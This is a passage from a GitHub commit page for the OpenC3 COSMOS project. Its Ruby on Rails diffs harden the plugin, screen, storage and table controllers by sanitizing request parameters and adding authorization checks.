|  |  | result = OpenC3::ProcessManager.instance.spawn( |
|  |  | ["ruby", "/openc3/bin/openc3cli", "load", gem\_name, params[:scope], plugin\_hash\_file\_path, "force"], # force install |
|  |  | "plugin\_install", params[:id], Time.now + 1.hour, temp\_dir: temp\_dir, scope: params[:scope] |
|  |  | ["ruby", "/openc3/bin/openc3cli", "load", gem\_name, scope, plugin\_hash\_file\_path, "force"], # force install |
|  |  | "plugin\_install", params[:id], Time.now + 1.hour, temp\_dir: temp\_dir, scope: scope |
|  |  | ) |
|  |  | render :json => result.name |
|  |  | rescue Exception => error |
| Expand All | | @@ -88,7 +96,9 @@ def install |
|  |  | def destroy |
|  |  | return unless authorization('admin') |
|  |  | begin |
|  |  | result = OpenC3::ProcessManager.instance.spawn(["ruby", "/openc3/bin/openc3cli", "unload", params[:id], params[:scope]], "plugin\_uninstall", params[:id], Time.now + 1.hour, scope: params[:scope]) |
|  |  | id, scope = sanitize\_params([:id, scope]) |
|  |  | return unless id and scope |
|  |  | result = OpenC3::ProcessManager.instance.spawn(["ruby", "/openc3/bin/openc3cli", "unload", id, scope], "plugin\_uninstall", id, Time.now + 1.hour, scope: scope) |
|  |  | render :json => result.name |
|  |  | rescue Exception => error |
|  |  | render(:json => { :status => 'error', :message => error.message }, :status => 500) and return |
| Expand Down | |  |

19 changes: 15 additions & 4 deletions

19
[openc3-cosmos-cmd-tlm-api/app/controllers/screens\_controller.rb](#diff-7017eee377ef39de0fa5c730b82417ff0f7f5f2f8e7f0b3fab4818f6092f06ab "openc3-cosmos-cmd-tlm-api/app/controllers/screens_controller.rb")

Show comments

[View file](/OpenC3/cosmos/blob/a34e61aea5a465f0ab3e57d833ae7ff4cafd710b/openc3-cosmos-cmd-tlm-api/app/controllers/screens_controller.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -19,12 +19,17 @@ |
|  |  | class ScreensController < ApplicationController |
|  |  | def index |
|  |  | return unless authorization('system') |
|  |  | render :json => Screen.all(\*params.require([:scope])) |
|  |  | scope = sanitize\_params([:scope]) |
|  |  | return unless scope |
|  |  | scope = scope[0] |
|  |  | render :json => Screen.all(scope) |
|  |  | end |
|  |  |  |
|  |  | def show |
|  |  | return unless authorization('system') |
|  |  | screen = Screen.find(\*params.require([:scope, :target, :screen])) |
|  |  | result = sanitize\_params([:scope, :target, :screen]) |
|  |  | return unless result |
|  |  | screen = Screen.find(\*result) |
|  |  | if screen |
|  |  | render :json => screen |
|  |  | else |
| Expand All | | @@ -34,7 +39,11 @@ def show |
|  |  |  |
|  |  | def create |
|  |  | return unless authorization('system\_set') |
|  |  | screen = Screen.create(\*params.require([:scope, :target, :screen, :text])) |
|  |  | result = sanitize\_params([:scope, :target, :screen]) |
|  |  | return unless result |
|  |  | text = params.require([:text])[0] |
|  |  | result << text |
|  |  | screen = Screen.create(\*result) |
|  |  | OpenC3::Logger.info("Screen saved: #{params[:target]} #{params[:screen]}", scope: params[:scope], user: username()) |
|  |  | render :json => screen |
|  |  | rescue => e |
| Expand All | | @@ -43,7 +52,9 @@ def create |
|  |  |  |
|  |  | def destroy |
|  |  | return unless authorization('system\_set') |
|  |  | screen = Screen.destroy(\*params.require([:scope, :target, :screen])) |
|  |  | result = sanitize\_params([:scope, :target, :screen]) |
|  |  | return unless result |
|  |  | screen = Screen.destroy(\*result) |
|  |  | OpenC3::Logger.info("Screen deleted: #{params[:target]} #{params[:screen]}", scope: params[:scope], user: username()) |
|  |  | head :ok |
|  |  | rescue => e |
| Expand Down | |  |

2 changes: 2 additions & 0 deletions

2
[openc3-cosmos-cmd-tlm-api/app/controllers/storage\_controller.rb](#diff-25f49e6df120984bb9c20fddab11a5d797964b01bd6af02dd1f0085a771a955a "openc3-cosmos-cmd-tlm-api/app/controllers/storage_controller.rb")

Show comments

[View file](/OpenC3/cosmos/blob/a34e61aea5a465f0ab3e57d833ae7ff4cafd710b/openc3-cosmos-cmd-tlm-api/app/controllers/storage_controller.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -25,6 +25,7 @@ |
|  |  |  |
|  |  | class StorageController < ApplicationController |
|  |  | def buckets |
|  |  | return unless authorization('system') |
|  |  | # ENV.map returns a big array of mostly nils which is why we compact |
|  |  | # The non-nil are MatchData objects due to the regex match |
|  |  | matches = ENV.map { |key, \_value| key.match(/^OPENC3\_(.+)\_BUCKET$/) }.compact |
| Expand All | | @@ -35,6 +36,7 @@ def buckets |
|  |  | end |
|  |  |  |
|  |  | def volumes |
|  |  | return unless authorization('system') |
|  |  | # ENV.map returns a big array of mostly nils which is why we compact |
|  |  | # The non-nil are MatchData objects due to the regex match |
|  |  | matches = ENV.map { |key, \_value| key.match(/^OPENC3\_(.+)\_VOLUME$/) }.compact |
| Expand Down | |  |

77 changes: 43 additions & 34 deletions

77
[openc3-cosmos-cmd-tlm-api/app/controllers/tables\_controller.rb](#diff-335d9bf03df87c309d94d2c35ea0abb3a1b26f118b8eff2997c21695e33f4f3a "openc3-cosmos-cmd-tlm-api/app/controllers/tables_controller.rb")

Show comments

[View file](/OpenC3/cosmos/blob/a34e61aea5a465f0ab3e57d833ae7ff4cafd710b/openc3-cosmos-cmd-tlm-api/app/controllers/tables_controller.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -23,17 +23,20 @@ |
|  |  | require 'base64' |
|  |  |  |
|  |  | class TablesController < ApplicationController |
|  |  | before\_action :sanitize\_scope |
|  |  |  |
|  |  | def index |
|  |  | return unless authorization('system') |
|  |  | render json: Table.all(params[:scope]) |
|  |  | scope = sanitize\_params([:scope]) |
|  |  | return unless scope |
|  |  | scope = scope[0] |
|  |  | render json: Table.all(scope) |
|  |  | end |
|  |  |  |
|  |  | def binary |
|  |  | return unless authorization('system') |
|  |  | scope, binary, definition, table = sanitize\_params([:scope, :binary, :definition, :table], require\_params: false, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | begin |
|  |  | file = Table.binary(params[:scope], params[:binary], params[:definition], params[:table]) |
|  |  | file = Table.binary(scope, binary, definition, table) |
|  |  | results = { 'filename' => file.filename, 'contents' => Base64.encode64(file.contents) } |
|  |  | render json: results |
|  |  | rescue Table::NotFound => e |
| Expand All | | @@ -44,8 +47,10 @@ def binary |
|  |  |  |
|  |  | def definition |
|  |  | return unless authorization('system') |
|  |  | scope, definition, table = sanitize\_params([:scope, :definition, :table], require\_params: false, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | begin |
|  |  | file = Table.definition(params[:scope], params[:definition], params[:table]) |
|  |  | file = Table.definition(scope, definition, table) |
|  |  | render json: { 'filename' => file.filename, 'contents' => file.contents } |
|  |  | rescue Table::NotFound => e |
|  |  | render(json: { status: 'error', message: e.message }, status: 404) and |
| Expand All | | @@ -55,8 +60,10 @@ def definition |
|  |  |  |
|  |  | def report |
|  |  | return unless authorization('system') |
|  |  | scope, binary, definition, table = sanitize\_params([:scope, :binary, :definition, :table], require\_params: false, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | begin |
|  |  | file = Table.report(params[:scope], params[:binary], params[:definition], params[:table]) |
|  |  | file = Table.report(scope, binary, definition, table) |
|  |  | render json: { 'filename' => file.filename, 'contents' => file.contents } |
|  |  | rescue Table::NotFound => e |
|  |  | render(json: { status: 'error', message: e.message }, status: 404) and |
| Expand All | | @@ -66,17 +73,19 @@ def report |
|  |  |  |
|  |  | def body |
|  |  | return unless authorization('system') |
|  |  | scope, name = sanitize\_params([:scope, :name], require\_params: true, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | # body doesn't raise if not found ... it returns nil |
|  |  | file = Table.body(params[:scope], params[:name]) |
|  |  | file = Table.body(scope, name) |
|  |  | if file |
|  |  | results = {} |
|  |  |  |
|  |  | if File.extname(params[:name]) == '.txt' |
|  |  | if File.extname(name) == '.txt' |
|  |  | results = { 'contents' => file } |
|  |  | else |
|  |  | locked = Table.locked?(params[:scope], params[:name]) |
|  |  | locked = Table.locked?(scope, name) |
|  |  | unless locked |
|  |  | Table.lock(params[:scope], params[:name], username()) |
|  |  | Table.lock(scope, name, username()) |
|  |  | end |
|  |  | results = { 'contents' => Base64.encode64(file), 'locked' => locked } |
|  |  | end |
| Expand All | | @@ -91,8 +100,10 @@ def body |
|  |  |  |
|  |  | def load |
|  |  | return unless authorization('system') |
|  |  | scope, binary, definition = sanitize\_params([:scope, :binary, :definition], require\_params: false, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | begin |
|  |  | render json: Table.load(params[:scope], params[:binary], params[:definition]) |
|  |  | render json: Table.load(scope, binary, definition) |
|  |  | rescue Table::NotFound => e |
|  |  | render(json: { status: 'error', message: e.message }, status: 404) and |
|  |  | return |
| Expand All | | @@ -101,8 +112,10 @@ def load |
|  |  |  |
|  |  | def save |
|  |  | return unless authorization('system') |
|  |  | scope, binary, definition = sanitize\_params([:scope, :binary, :definition], require\_params: false, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | begin |
|  |  | Table.save(params[:scope], params[:binary], params[:definition], params[:tables]) |
|  |  | Table.save(scope, binary, definition, params[:tables]) |
|  |  | head :ok |
|  |  | rescue Table::NotFound => e |
|  |  | render(json: { status: 'error', message: e.message }, status: 404) and |
| Expand All | | @@ -112,8 +125,10 @@ def save |
|  |  |  |
|  |  | def save\_as |
|  |  | return unless authorization('system') |
|  |  | scope, name, new\_name = sanitize\_params([:scope, :name, :new\_name], require\_params: true, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | begin |
|  |  | Table.save\_as(params[:scope], params[:name], params[:new\_name]) |
|  |  | Table.save\_as(scope, name, new\_name) |
|  |  | head :ok |
|  |  | rescue Table::NotFound => e |
|  |  | render(json: { status: 'error', message: e.message }, status: 404) and |
| Expand All | | @@ -123,8 +138,10 @@ def save\_as |
|  |  |  |
|  |  | def generate |
|  |  | return unless authorization('system') |
|  |  | scope, definition = sanitize\_params([:scope, :definition], require\_params: false, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | begin |
|  |  | filename = Table.generate(params[:scope], params[:definition]) |
|  |  | filename = Table.generate(scope, definition) |
|  |  | render json: { 'filename' => filename } |
|  |  | rescue Table::NotFound => e |
|  |  | render(json: { status: 'error', message: e.message }, status: 404) and |
| Expand All | | @@ -134,40 +151,32 @@ def generate |
|  |  |  |
|  |  | def lock |
|  |  | return unless authorization('system') |
|  |  | Table.lock(params[:scope], params[:name], username()) |
|  |  | scope, name = sanitize\_params([:scope, :name], require\_params: true, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | Table.lock(scope, name, username()) |
|  |  | render status: 200 |
|  |  | end |
|  |  |  |
|  |  | def unlock |
|  |  | return unless authorization('system') |
|  |  | locked\_by = Table.locked?(params[:scope], params[:name]) |
|  |  | Table.unlock(params[:scope], params[:name]) if username() == locked\_by |
|  |  | scope, name = sanitize\_params([:scope, :name], require\_params: true, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | locked\_by = Table.locked?(scope, name) |
|  |  | Table.unlock(scope, name) if username() == locked\_by |
|  |  | render status: 200 |
|  |  | end |
|  |  |  |
|  |  | def destroy |
|  |  | return unless authorization('system') |
|  |  | scope, name = sanitize\_params([:scope, :name], require\_params: true, allow\_forward\_slash: true) |
|  |  | return unless scope |
|  |  | # destroy returns no indication of success or failure so just assume it worked |
|  |  | Table.destroy(params[:scope], params[:name]) |
|  |  | Table.destroy(scope, name) |
|  |  | OpenC3::Logger.info( |
|  |  | "Table destroyed: #{params[:name]}", |
|  |  | scope: params[:scope], |
|  |  | "Table destroyed: #{name}", |
|  |  | scope: scope, |
|  |  | user: username() |
|  |  | ) |
|  |  | head :ok |
|  |  | end |
|  |  |  |
|  |  | private |
|  |  |  |
|  |  | def sanitize\_scope |
|  |  | # scope is passed as a parameter and we use it to create paths in local\_mode, |
|  |  | # thus we have to sanitize it or the code scanner detects: |
|  |  | # "Uncontrolled data used in path expression" |
|  |  | # This method is taken directly from the Rails source: |
|  |  | # https://api.rubyonrails.org/v5.2/classes/ActiveStorage/Filename.html#method-i-sanitized |
|  |  | scope = params[:scope].encode(Encoding::UTF\_8, invalid: :replace, undef: :replace, replace: "�").strip.tr("\u{202E}%$|:;/\t\r\n\\", "-") |
|  |  | if scope != params[:scope] |
|  |  | render(json: { status: 'error', message: "Invalid scope: #{params[:scope]}" }, status: 400) |
|  |  | end |
|  |  | end |
|  |  | end |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `a34e61a`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fcommit%2Fa34e61aea5a465f0ab3e57d833ae7ff4cafd710b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


